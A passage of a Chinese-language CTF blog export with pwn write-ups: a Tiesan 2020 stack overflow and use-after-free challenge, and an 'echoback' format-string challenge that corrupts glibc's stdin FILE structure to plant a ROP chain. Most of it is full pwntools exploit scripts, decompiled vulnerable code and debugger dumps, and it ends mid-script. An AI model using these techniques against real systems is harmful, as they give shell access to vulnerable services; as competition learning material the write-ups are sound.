thread.7f5d33cbe640start thread.7f5d2bfff640start thread.7f5d334bd640start thread.7f5d32cbc640start thread.7f5d324bb640start thread.7f5d31cba640start thread.7f5d314b9640start thread.7f5d30cb8640start thread.7f5d2b7fe640start thread.7f5d2affd640start thread.7f5d29ffb640start thread.7f5d2a7fc640start thread.7f5d297fa640start thread.7f5d28ff9640start thread.7f5d137fe640start thread.7f5d127fc640start thread.7f5d12ffd640start thread.7f5d13fff640┌[logan☮arch]-(~)└&gt; echo $?                  0\n\n程序安全退出。要想证明是安全的，只能看glibc源代码。\nhttps://code.woboq.org/userspace/glibc/malloc/malloc.c.html#283bytes\n","categories":["security"],"tags":["test"]},{"title":"铁三初赛PWN Wp","url":"/2020/11/08/security/ctf/compitation/wp-tiesan-2020/","content":"铁三初赛PWN多亏师傅们带飞，本次排名第四赛区第二，排名如下^_^\n\npwn1[namepie]ssize_t sub_9A0()&#123;  char s; // [rsp+0h] [rbp-30h]  unsigned __int64 v2; // [rsp+28h] [rbp-8h]  v2 = __readfsqword(0x28u);  memset(&amp;s, 0, 0x1EuLL);  puts(&quot;Input your Name:&quot;);  read(0, &amp;s, 0x30uLL);//vul  printf(&quot;hello %s: and what do your want to sey!\\n&quot;, &amp;s);  return read(0, &amp;s, 0x60uLL); //vul2 堆栈溢出&#125;\n\n前言程序留了后面函数，保护全开\n思路先使用第一次输入泄露cannary，然后在使用后一次输入低字节覆盖return 地址为后门函数地址，打通几率1 &#x2F; 16\nEXP#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0gan# Env: Linux arch 5.8.14-arch1-1from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;pwn&#x27;libc_path = &#x27;./libc.so.6&#x27;# remote server ip and portserver_ip = &quot;172.20.14.177&quot;server_port = 9999# if local debugLOCAL = 0LIBC  = 0#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tp = &#x27;A&#x27; * 0x28 + &#x27;\\x01&#x27;\ts(p)\tru(&#x27;\\x01&#x27;)\tcannary = u64(&#x27;\\x00&#x27; + r(7))\tli(&#x27;cannary: &#x27; + hex(cannary))\tp = &#x27;A&#x27; * 0x28\tp += p64(cannary)\tp += p64(0)\tp += &#x27;\\x71\\xaa&#x27;\t#db()\ts(p)\tdef finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\t#for i in range(255):\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process()\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\n\n\npwn2 [onetime]前言pie保护没开，一个菜单堆题，在添加和删除编辑都采用相应的标致来避免重复第二次操作。漏洞点在释放内存后没有将数据指针清0还有在其他操作没有做好相应的检查，造成uaf漏洞。\n思路通过uaf漏洞，打入bss段的buf附近，修改edit_flag为0为了再次实现修改功能，同时修改buf为atoi plt.got地址，然后再通过uaf漏洞泄露libc，再次修改atoi的got中数据为libc中system函数地址，在输入选项时输入’sh\\x00’即可获得shell\nEXP#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0gan# Env: Linux arch 5.8.14-arch1-1from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li  = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;pwn&#x27;MODIFY_LD = 0arch = &#x27;64&#x27;libc_v = &#x27;2.23&#x27;ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# change ld path if(MODIFY_LD):\tos.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)# remote server ip and portserver_ip = &quot;172.20.14.177&quot;server_port = 10001# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ad():\tsla(&#x27;&gt;&gt;&#x27;, &#x27;1&#x27;)def fi(d):\tsla(&#x27;&gt;&gt;&#x27;, &#x27;2&#x27;)\tsa(&#x27;:&#x27;, d)def dp():\tsla(&#x27;&gt;&gt;&#x27;, &#x27;3&#x27;)def rm():\tsla(&#x27;&gt;&gt;&#x27;, &#x27;4&#x27;)def lv(d):\tsla(&#x27;&gt;&gt;&#x27;, &#x27;5&#x27;)\tsa(&#x27;:&#x27;, d)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tad()\trm()\tp = p64(0x60207d + 0x10)\tfi(p)\tad()\tp = &#x27;A&#x27; * 3\tp += p64(0)\tp += p64(elf.got[&#x27;atoi&#x27;])\tlv(p)\tdp()\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;)\tlibc_base = leak - libc.sym[&#x27;atoi&#x27;]\tsystem = libc_base + libc.sym[&#x27;system&#x27;]\tli(&#x27;libc_base: &#x27; +hex(libc_base))\tfi(p64(system))\t#db()\ts(&#x27;sh\\x00&#x27;)def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path&#125; )\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n","categories":["ctf"],"tags":["pwn"]},{"title":"OTHER WRITE UP FOR ME","url":"/2020/11/08/security/ctf/compitation/wp-other/","content":"OTHER WRITE UP FOR MEechoback题目来源: World of Attack &amp; Defense\nchecksecArch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled\n\nvulunsigned __int64 __fastcall sub_B80(_BYTE *a1)&#123;  size_t nbytes; // [rsp+1Ch] [rbp-14h] long int  unsigned __int64 v3; // [rsp+28h] [rbp-8h]  v3 = __readfsqword(0x28u);  memset((char *)&amp;nbytes + 4, 0, 8uLL);  printf(&quot;length:&quot;, 0LL);  _isoc99_scanf(&quot;%d&quot;, &amp;nbytes);  getchar();  if ( (nbytes &amp; 0x80000000) != 0LL || (signed int)nbytes &gt; 6 )    LODWORD(nbytes) = 7; //limits  read(0, (char *)&amp;nbytes + 4, (unsigned int)nbytes);  if ( *a1 )    printf(&quot;%s say:&quot;, a1);  else    printf(&quot;anonymous say:&quot;, (char *)&amp;nbytes + 4);  printf((const char *)&amp;nbytes + 4);            // fmt vum  return __readfsqword(0x28u) ^ v3;&#125;\n\n明显的字符串漏洞,但是最多只允许输入7个字符.\n思路通过利用字符串漏洞泄漏libc基地址, elf基地址, 修改 _IO_FILE struct,然后打入stack 中的 &amp;main ret构造rop链\n泄漏libc基址传入 %p调试到vfprintf函数堆栈如下:\n0x7ffe31470828 —▸ 0x7ffe3146e250 ◂— &#x27;anonymous say:&#x27;07:0038│      0x7ffe31470830 —▸ 0x7f81d9132780 (_IO_stdfile_1_lock) ◂— 0x008:0040│      0x7ffe31470838 —▸ 0x7f81d8e632c0 (__write_nocancel+7) ◂— cmp    rax, -0xfff09:0048│      0x7ffe31470840 —▸ 0x7f81d9339700 ◂— 0x7f81d93397000a:0050│      0x7ffe31470848 ◂— 0xe0b:0058│      0x7ffe31470850 ◂— 0x6562b0260c:0060│      0x7ffe31470858 —▸ 0x7f81d91316a3 (_IO_2_1_stdout_+131) ◂— 0x132780000000000a ...           ...28:0140│      0x7ffe31470938 ◂— 0x746df13682d53b0029:0148│      0x7ffe31470940 —▸ 0x562293252d30 ◂— push   r152a:0150│      0x7ffe31470948 —▸ 0x7f81d8d8c830 (__libc_start_main+240) ◂— mov    edi, eax2b:0158│      0x7ffe31470950 —▸ 0x7ffe31470a28 —▸ 0x7ffe31470fb8\n\n通过调试, 传入 %p打印时, 打印出0x7ffe31470830, 而 __libc_start_main+240 的地址在0x7ffe31470948, 调试不断加1进行核对地址,最终在 %19$p打印出libc_start_main + 240的地址.然后通过计算即可获取libc基址\n# leaking libc base\tsla(&#x27;&gt;&gt;&#x27;, str(2))\tsla(&#x27;:&#x27;, str(7))\tp = &#x27;%19$p&#x27;\tsl(p)\tru(&#x27;0x&#x27;)\tlibc_start_main = int(r(12),16) - 240\tlibc_base = libc_start_main - lib.sym[&#x27;__libc_start_main&#x27;]\tli(&#x27;libc_base:&#x27; + hex(libc_base))\tsys_addr = libc_base + lib.sym[&#x27;system&#x27;]\tsh_addr  = libc_base + lib.search(&#x27;/bin/sh&#x27;).next()\n\n泄漏elf基址传入 %14$p查看printf函数中堆栈分布如下\n05:0028│ rdi  0x7ffc6b02ca80 ◂— 0xa7024343125 /* &#x27;%14$p\\n&#x27; */06:0030│      0x7ffc6b02ca88 ◂— 0xb8b63dff1d80240007:0038│ rbp  0x7ffc6b02ca90 —▸ 0x7ffc6b02cac0 —▸ 0x55f4515b5d30 ◂— push   r1508:0040│      0x7ffc6b02ca98 —▸ 0x55f4515b5d08 ◂— jmp    0x55f4515b5d0b09:0048│      0x7ffc6b02caa0 —▸ 0x55f4515b5d30 ◂— push   r150a:0050│      0x7ffc6b02caa8 ◂— 0x2000000000b:0058│      0x7ffc6b02cab0 ◂— 0x00c:0060│      0x7ffc6b02cab8 ◂— 0xb8b63dff1d802400\n\n打印出0x55f4515b5d30 ◂— push   r15, 而这个位置刚好在init函数的起始位置.在文件中偏移为: 0xD30 ( push    r15),这就可以计算elf的偏移了.然后获取main, pop rid的地址.\n# leaking elf base\tsla(&#x27;&gt;&gt;&#x27;, str(2))\tsla(&#x27;:&#x27;, str(7))\tp = &#x27;%14$p&#x27;\tsl(p)\tru(&#x27;0x&#x27;)\telf_base = int(r(12),16) - 0xD30\tmain_addr = elf_base + 0xC6C\tpop_rdi_ret = elf_base + 0xd93\tli(&#x27;elf_base:&#x27; + hex(elf_base))\n\n\n\n泄漏堆栈中main ret地址下图为printf函数中的堆栈\npwndbg&gt; stack 10000:0000│ rsp  0x7fffb8e184a8 —▸ 0x55ff36954c55 ◂— nop    01:0008│      0x7fffb8e184b0 —▸ 0x55ff36954ef8 ◂— xor    ebp, dword ptr [rsi] /* &#x27;3. exit&#x27; */02:0010│      0x7fffb8e184b8 —▸ 0x7fffb8e18500 ◂— 0x003:0018│      0x7fffb8e184c0 ◂— 0xa32 /* &#x27;2\\n&#x27; */04:0020│      0x7fffb8e184c8 ◂— 0x7134b990005:0028│ rdi  0x7fffb8e184d0 ◂— 0xa7024353125 /* &#x27;%15$p\\n&#x27; */06:0030│      0x7fffb8e184d8 ◂— 0xc7f0a378134b990007:0038│ rbp  0x7fffb8e184e0 —▸ 0x7fffb8e18510 #泄漏该地址, 获取main ret08:0040│      0x7fffb8e184e8 —▸ 0x55ff36954d08 ◂— jmp    0x55ff36954d0b09:0048│      0x7fffb8e184f0 —▸ 0x55ff36954d30 ◂— push   r150a:0050│      0x7fffb8e184f8 ◂— 0x2000000000b:0058│      0x7fffb8e18500 ◂— 0x00c:0060│      0x7fffb8e18508 ◂— 0xc7f0a378134b99000d:0068│      0x7fffb8e18510 —▸ 0x55ff36954d30 ◂— push   r15 # main rbp0e:0070│      0x7fffb8e18518 —▸ 0x7fa5b79af830 (__libc_start_main+240) #mian的返回地址\n\n以上0x7fffb8e18518就是我们要获取的main ret的堆栈地址, 在这里不能直接泄漏堆栈中的main ret地址,但可以通过泄漏 rbp地址来+8即可获取man ret.\n#leaking main ret in stack\tsla(&#x27;&gt;&gt;&#x27;, str(2))\tsla(&#x27;:&#x27;, str(7))\tp = &#x27;%12$p&#x27;\tsl(p)\tru(&#x27;0x&#x27;)\tmain_ret = int(r(12),16) + 0x8\n\n\n修改_IO_FILE将数据打入stack目前,准备工作基本完毕, 现在就是要靠修改main ret地址来劫持程序流, 但是我们想构造payload，往main_ret处写数据，但是光一个p64(main_ret)包装就占了8个字符，而我们最多允许输入7个字符，setName，它不是白放那里的，它有着重要的作用.\n它也可以接受7个字符，我们可以把main_ret存入a1中，虽然只允许7个字符，p64()有8字节，但是末尾一般都是0，由于是低位存储，也就是数据的前导0被舍弃，没有影响，除非那个数据8字节没有前导0\n然后，发现，%16$p输出的就是a1的数据,于是，可以先setName(p64(addr))，然后利用%16$n来对addr处写数据然而，我们这样来直接写main_ret处的数据，还是不行，因为我们构造的payload始终长度都会大于7,于是，就需要用到一个新知识了，为了绕过7个字符的限制，利用printf漏洞先去攻击scanf内部结构，然后就可以直接利用scanf往目标处输入数据，这就需要去了解scanf的源码.\n_IO_FILE struct/*_IO_FILE *stdin = (FILE *) &amp;_IO_2_1_stdin_;    _IO_FILE *stdout = (FILE *) &amp;_IO_2_1_stdout_;    _IO_FILE *stderr = (FILE *) &amp;_IO_2_1_stderr_; *//* The tag name of this struct is _IO_FILE to preserve historic    C++ mangled names for functions taking FILE* arguments.    That name should not be used in new code.  */  struct _IO_FILE  &#123;    int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */      /* The following pointers correspond to the C++ streambuf protocol. */    char *_IO_read_ptr;   /* Current read pointer */    char *_IO_read_end;   /* End of get area. */    char *_IO_read_base;  /* Start of putback+get area. */    char *_IO_write_base; /* Start of put area. */    char *_IO_write_ptr;  /* Current put pointer. */    char *_IO_write_end;  /* End of put area. */    char *_IO_buf_base;   /* Start of reserve area. */    char *_IO_buf_end;    /* End of reserve area. */      /* The following fields are used to support backing up and undo. */    char *_IO_save_base; /* Pointer to start of non-current get area. */    char *_IO_backup_base;  /* Pointer to first valid character of backup area */    char *_IO_save_end; /* Pointer to end of non-current get area. */      struct _IO_marker *_markers;      struct _IO_FILE *_chain;      int _fileno;    int _flags2;    __off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */      /* 1+column number of pbase(); 0 is unknown. */    unsigned short _cur_column;    signed char _vtable_offset;    char _shortbuf[1];      _IO_lock_t *_lock;  #ifdef _IO_USE_OLD_IO_FILE  &#125;;  \n\n_IO_new_file_underflow看看文件的读取过程**_IO_new_file_underflow** 这个函数最终调用了_IO_SYSREAD****系统调用来读取文件。在这之前，它做了一些处理\nint _IO_new_file_underflow (FILE *fp)  &#123;    ssize_t count;      /* C99 requires EOF to be &quot;sticky&quot;.  */    if (fp-&gt;_flags &amp; _IO_EOF_SEEN)      return EOF;      if (fp-&gt;_flags &amp; _IO_NO_READS)      &#123;        fp-&gt;_flags |= _IO_ERR_SEEN;        __set_errno (EBADF);        return EOF;      &#125;    if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)  //判断是否已经读完    return *(unsigned char *) fp-&gt;_IO_read_ptr;      if (fp-&gt;_IO_buf_base == NULL)      &#123;        /* Maybe we already have a push back pointer.  */        if (fp-&gt;_IO_save_base != NULL)      &#123;        free (fp-&gt;_IO_save_base);        fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;      &#125;        _IO_doallocbuf (fp);      &#125;      /* FIXME This can/should be moved to genops ?? */    if (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))      &#123;        /* We used to flush all line-buffered stream.  This really isn&#x27;t      required by any standard.  My recollection is that      traditional Unix systems did this for stdout.  stderr better      not be line buffered.  So we do just that here      explicitly.  --drepper */        _IO_acquire_lock (_IO_stdout);          if ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))        == (_IO_LINKED | _IO_LINE_BUF))      _IO_OVERFLOW (_IO_stdout, EOF);          _IO_release_lock (_IO_stdout);      &#125;      _IO_switch_to_get_mode (fp);      /* This is very tricky. We have to adjust those      pointers before we call _IO_SYSREAD () since      we may longjump () out while waiting for      input. Those pointers may be screwed up. H.J. */    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;    fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;  //重新设置新的 _IO_buf_base  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end      = fp-&gt;_IO_buf_base;    //--------------------------------------  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,  //系统向_IO_buf_base指向的缓冲区写入读取的数据          fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);//写入长度:fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base      if (count &lt;= 0)      &#123;        if (count == 0)      fp-&gt;_flags |= _IO_EOF_SEEN;        else      fp-&gt;_flags |= _IO_ERR_SEEN, count = 0;    &#125;    fp-&gt;_IO_read_end += count; //使 _IO_read_end指针向后移动   if (count == 0)      &#123;        /* If a stream is read to EOF, the calling application may switch active      handles.  As a result, our offset cache would no longer be valid, so      unset it.  */        fp-&gt;_offset = _IO_pos_BAD;        return EOF;      &#125;    if (fp-&gt;_offset != _IO_pos_BAD)      _IO_pos_adjust (fp-&gt;_offset, count);    return *(unsigned char *) fp-&gt;_IO_read_ptr;  &#125;\n\n利用IO_SYSREAD系统调用，向fp-&gt;_IO_buf_base处写入读取的数据，并且长度为 fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base\n要是能够修改_IO_buf_base和_IO_buf_end 那么就可以实现任意位置和想要的长度\n首先需要定位到_IO_2_1_stdin_结构体在内存中的位置，然后再定位到_IO_buf_base 的位置，_IO_buf_base位于结构体中的第8个，所以，它的_IO_buf_base_addr &#x3D; _IO_buf_base + 0x8 * 7 (注意结构体对齐,int占用内存8字节,所以为 0x8 * 7 而不是 0x8 * 6 + 4)\n#leaking_IO_buf_base_IO_2_1_stdin_ = libc_base + lib.sym[&#x27;_IO_2_1_stdin_&#x27;]_IO_buf_base = _IO_2_1_stdin_ + 0x8 * 7li(&#x27;_IO_buf_base&#x27; + hex(_IO_buf_base))\n\n来看看_IO_buf_base的值\n0x7ffb6a2b08e0 &lt;_IO_2_1_stdin_&gt;:\t0x00000000fbad208b\t0x00007ffb6a2b09640x7ffb6a2b08f0 &lt;_IO_2_1_stdin_+16&gt;:\t0x00007ffb6a2b0964\t0x00007ffb6a2b09630x7ffb6a2b0900 &lt;_IO_2_1_stdin_+32&gt;:\t0x00007ffb6a2b0963\t0x00007ffb6a2b09630x7ffb6a2b0910 &lt;_IO_2_1_stdin_+48&gt;:\t0x00007ffb6a2b0963\t0x00007ffb6a2b0963 //IO_buf_base0x7ffb6a2b0920 &lt;_IO_2_1_stdin_+64&gt;:\t0x00007ffb6a2b0964\t0x0000000000000000 //IO_buf_end0x7ffb6a2b0930 &lt;_IO_2_1_stdin_+80&gt;:\t0x0000000000000000\t0x00000000000000000x7ffb6a2b0940 &lt;_IO_2_1_stdin_+96&gt;:\t0x0000000000000000\t0x00000000000000000x7ffb6a2b0950 &lt;_IO_2_1_stdin_+112&gt;:\t0x0000000000000000\t0xffffffffffffffff0x7ffb6a2b0960 &lt;_IO_2_1_stdin_+128&gt;:\t0x000000000a000000\t0x00007ffb6a2b27900x7ffb6a2b0970 &lt;_IO_2_1_stdin_+144&gt;:\t0xffffffffffffffff\t0x00000000000000000x7ffb6a2b0980 &lt;_IO_2_1_stdin_+160&gt;:\t0x00007ffb6a2b09c0\t0x00000000000000000x7ffb6a2b0990 &lt;_IO_2_1_stdin_+176&gt;:\t0x0000000000000000\t0x00000000000000000x7ffb6a2b09a0 &lt;_IO_2_1_stdin_+192&gt;:\t0x00000000ffffffff\t0x00000000000000000x7ffb6a2b09b0 &lt;_IO_2_1_stdin_+208&gt;:\t0x0000000000000000\t0x00007ffb6a2af6e0\n\n先是stdin的位置,当前位于0x7ffb6a2b08e0\n然后是_IO_buf_base，它位于0x7ffb6a2b08e0 + 0x8 * 7 &#x3D; 0x7ffb6a2b0918 ，它的值为0x00007ffb6a2b0963 ， 并且要知道，它的值相对_IO_2_1_stdin_的地址总是不变的，假如我们把_IO_buf_base的低一字节覆盖为0，那么他就变成了0x00007ffb6a2b0900 ，也就是0x7ffb6a2b08e0 + 0x8 * 4处，跑到了结构体内部去了，是结构体中的第5个数据处，也是_IO_write_base处，并且由于_IO_buf_end没变，那么我们可以从0x00007ffb6a2b0900处向后输入0x64-0x00 &#x3D; 0x64个字符，那么就能把_IO_buf_base和_IO_buf_end都覆盖成关键地址，就能绕过7个字符的输入限制,且可以实现write anything anywhere\n先来覆盖_IO_buf_base的低1字节为0\n#modify _IO_buf_basesla(&#x27;&gt;&gt;&#x27;, str(1))p = p64(_IO_buf_base)sl(p)sla(&#x27;&gt;&gt;&#x27;, str(2))sla(&#x27;:&#x27;, str(7))p = &#x27;%16$hhn&#x27; #不打印,即个数为0sl(p)\n\n接下来，就可以覆盖结构体里的一些数据了\n对于_IO_buf_base之前的数据(_IO_write_base_IO_write_ptr, _IO_write_end)，最好原样的放回，不然不知道会出现什么问题，经过调试，发现它们的值都是0x83 + _IO_2_1_stdin_addr，然后接下来，覆盖_IO_buf_base和_IO_buf_end，将它设置为堆栈中的&amp;main ret, 然后即可实现写入数据时,就会向堆栈中写入数据,前提还需满足一些条件.\n于是，payload\n#build payload to modify _IO_2_1_stdin structp = p64(_IO_2_1_stdin_ + 0x83) * 3p += p64(main_ret) + p64(main_ret + 0x8 * 3)sla(&#x27;&gt;&gt;&#x27;, str(2))sa(&#x27;:&#x27;, p) #length:sl(&#x27;&#x27;)\n\n在length:后面发送payload, 因为这个地方用到了scanf\n现在，得绕过一个判断，这样调用scanf 输入数据时，才会往缓冲区写入输入的数据\nif (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)  //判断是否已经读完, 想要能写入缓冲数据,就得把让ptr &gt;= end,这样才能使新的数据重新读入到缓冲区里    return *(unsigned char *) fp-&gt;_IO_read_ptr;  \n\n之前，覆盖结构体数据时，后面执行了这一步，使得 fp-&gt;_IO_read_end +&#x3D; count 相当于fp-&gt;_IO_read_end +&#x3D; len(p)\nfp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;  //重新设置新的 _IO_buf_base....          ....count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,  //系统向_IO_buf_base指向的缓冲区写入读取的数据          fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);//写入长度:fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base....          ....fp-&gt;_IO_read_end += count; //使 _IO_read_end指针向后移动\n\n下面为输入之前的_IO_2_1_stdin_\n0x7fa95326b8e0 &lt;_IO_2_1_stdin_&gt;:\t0x00000000fbad208b\t0x00007fa95326b901 //_IO_read_ptr\t\t\t\t\t\t\t\t\t//IO_read_end0x7fa95326b8f0 &lt;_IO_2_1_stdin_+16&gt;:\t0x00007fa95326b928\t0x00007fa95326b9000x7fa95326b900 &lt;_IO_2_1_stdin_+32&gt;:\t0x00007fa95326b963\t0x00007fa95326b9630x7fa95326b910 &lt;_IO_2_1_stdin_+48&gt;:\t0x00007fa95326b963\t0x00007ffddf79fbe80x7fa95326b920 &lt;_IO_2_1_stdin_+64&gt;:\t0x00007ffddf79fc00\t0x0000000000000000\n\n而 getchar() 的作用是使fp-&gt;_IO_read_ptr + 1\n由于在覆盖结构体后，scanf的后面有一个getchar，执行了一次，所以还需要调用len(p)-1次getchar()，使_IO_read_ptr &#x3D;&#x3D;  PIO_read_end\n#call getchar() make fp-&gt;_IO_read_ptr == fp-&gt;_IO_read_endfor i in range(0, len(p) - 1):\tsla(&#x27;&gt;&gt;&#x27;, str(2))\tsla(&#x27;:&#x27;, &#x27;,&#x27;)\tsl(&#x27; &#x27;)\t\n\n调用 len(p) - 1次getchar()后, IO_2_1_stdin 如下\npwndbg&gt; x /40gx &amp;_IO_2_1_stdin_0x7f1a9a51f8e0 &lt;_IO_2_1_stdin_&gt;:\t0x00000000fbad208b\t0x00007f1a9a51f928 //_IO_read_ptr                                    //IO_read_end0x7f1a9a51f8f0 &lt;_IO_2_1_stdin_+16&gt;:\t0x00007f1a9a51f928\t0x00007f1a9a51f9000x7f1a9a51f900 &lt;_IO_2_1_stdin_+32&gt;:\t0x00007f1a9a51f963\t0x00007f1a9a51f9630x7f1a9a51f910 &lt;_IO_2_1_stdin_+48&gt;:\t0x00007f1a9a51f963\t0x00007fff14080e880x7f1a9a51f920 &lt;_IO_2_1_stdin_+64&gt;:\t0x00007fff14080ea0\t0x00000000000000000x7f1a9a51f930 &lt;_IO_2_1_stdin_+80&gt;:\t0x0000000000000000\t0x0000000000000000\n\n构造rop链然后再次输入的时候,输入的数据就会在stack中了,现在就可以构造rop链.\n#build rop chailsla(&#x27;&gt;&gt;&#x27;, str(2))p = p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)sla(&#x27;:&#x27;, p) #length:sl(&#x27;&#x27;)\t\n\n下面为输入修改后的堆栈\npwndbg&gt; stack 5000:0000│ rsp  0x7fff92ceeed8 —▸ 0x55c9b5337ad4 ◂— movzx  eax, byte ptr [rbp - 0x10]01:0008│ rsi  0x7fff92ceeee0 ◂— 0x002:0010│      0x7fff92ceeee8 ◂— 0x4a74f6baf7ec8d0003:0018│ rbp  0x7fff92ceeef0 —▸ 0x7fff92ceef00 —▸ 0x7fff92ceef30 —▸ 0x55c9b5337d30 ◂— push   r1504:0020│      0x7fff92ceeef8 —▸ 0x55c9b5337b43 ◂— pop    rbp05:0028│      0x7fff92ceef00 —▸ 0x7fff92ceef30 —▸ 0x55c9b5337d30 ◂— push   r1506:0030│      0x7fff92ceef08 —▸ 0x55c9b5337ccd ◂— mov    dword ptr [rbp - 0x14], eax07:0038│      0x7fff92ceef10 —▸ 0x55c9b5337d30 ◂— push   r1508:0040│      0x7fff92ceef18 ◂— 0xffffffda0000000109:0048│      0x7fff92ceef20 —▸ 0x7f53670f8918 (_IO_2_1_stdin_+56) —▸ 0x7fff92ceef38 —▸ 0x55c9b5337d93 ◂— pop    rdi0a:0050│      0x7fff92ceef28 ◂— 0x4a74f6baf7ec8d000b:0058│      0x7fff92ceef30 —▸ 0x55c9b5337d30 ◂— push   r150c:0060│      0x7fff92ceef38 —▸ 0x55c9b5337d93 ◂— pop    rdi //修改为pop_rdi _ret0d:0068│      0x7fff92ceef40 —▸ 0x7f5366ec0d57 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */0e:0070│      0x7fff92ceef48 —▸ 0x7f5366d79390 (system) ◂— test   rdi, rdi\n\ngetshell只需使main函数ret即可\n#get shell\tsla(&#x27;&gt;&gt;&#x27;, str(3))\n\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0gan# Team  : D0g3from pwn import *#from LibcSearcher import LibcSearcher#context.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile  = &quot;echo_back&quot;libFile  = &quot;./libc.so.6&quot;remoteIp = &quot;111.198.29.45&quot;remotePort = 54180LOCAL = 1LIBC  = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()pd32  = lambda x : p32(x).decode() #python3 not surport str + bytespd64  = lambda x : p64(x).decode()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def eb(length, text):\tsl(text)#--------------------------Exploit--------------------------def exploit():\t# leaking libc base\tsla(&#x27;&gt;&gt;&#x27;, str(2))\tsla(&#x27;:&#x27;, str(7))\tp = 